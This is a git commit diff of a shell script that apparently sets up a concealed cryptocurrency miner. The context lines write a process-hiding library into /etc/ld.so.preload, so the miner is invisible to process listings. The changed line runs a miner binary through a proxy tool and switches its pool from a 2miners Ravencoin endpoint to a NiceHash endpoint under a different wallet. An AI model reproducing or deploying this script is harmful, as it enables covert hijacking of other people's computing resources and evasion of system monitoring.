d4a3c169bc8770e016f5ae22bc82b2fd0b8cd5a5
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-05-17 20:41:48 +0700

    Update lebaransebentarlagi.sh

--- lebaransebentarlagi.sh
+++ lebaransebentarlagi.sh
@@ -46,4 +46,4 @@ mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 
-./graftcp/graftcp ./bezzHash --url=RLzCWW47RZzJsqy1VBRChU1QmdTqjeyF9p.prabu@rvn.2miners.com:6060 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=ssl://36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
